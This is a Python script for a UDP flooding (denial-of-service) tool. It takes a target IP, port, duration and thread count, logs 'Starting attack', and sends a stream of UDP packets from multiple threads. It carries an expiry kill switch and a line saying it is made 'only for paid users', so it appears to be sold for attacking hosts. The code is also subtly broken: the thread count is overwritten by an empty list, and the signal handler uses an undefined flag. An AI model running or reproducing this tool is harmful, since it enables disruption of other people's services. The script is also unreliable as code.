import os
import signal
import socket
import sys
import time
import threading
import logging
from datetime import datetime, timezone

# Constants
BUFFER_SIZE = 9096
EXPIRATION_YEAR = 2024
EXPIRATION_MONTH = 11
EXPIRATION_DAY = 30

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def check_expiration():
    expiration_date = datetime(EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY, tzinfo=timezone.utc)
    if datetime.now(timezone.utc) > expiration_date:
        logging.error("This file is closed by @rajaraj_01.")
        sys.exit(1)

def send_udp_traffic(ip, port, stop_flag):
    message = b"UDP traffic test"
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(message, (ip, port))
            sock.close()
        except Exception as e:
            logging.error(f"Send finished: {e}")
        time.sleep(1)

def signal_handler(sig, frame):
    logging.info(f"Received signal {sig}")
    stop_flag.set()

def main():
    if len(sys.argv) != 5:
        logging.error("Usage: %s <IP> <PORT> <DURATION> <THREADS>", sys.argv[0])
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])

    logging.info("Starting attack")
    logging.info(f"IP: {ip}")
    logging.info(f"PORT: {port}")
    logging.info(f"TIME: {duration} seconds")
    logging.info(f"THREADS: {threads}")
    logging.info("File is made by @rajaraj_01 only for paid users.")

    stop_flag = threading.Event()

    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame))
    signal.signal(signal.SIGTERM, lambda sig, frame: signal_handler(sig, frame))

    threads = []
    for i in range(threads):
        t = threading.Thread(target=send_udp_traffic, args=(ip, port, stop_flag))
        t.start()
        threads.append(t)

    time.sleep(duration)
    stop_flag.set()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()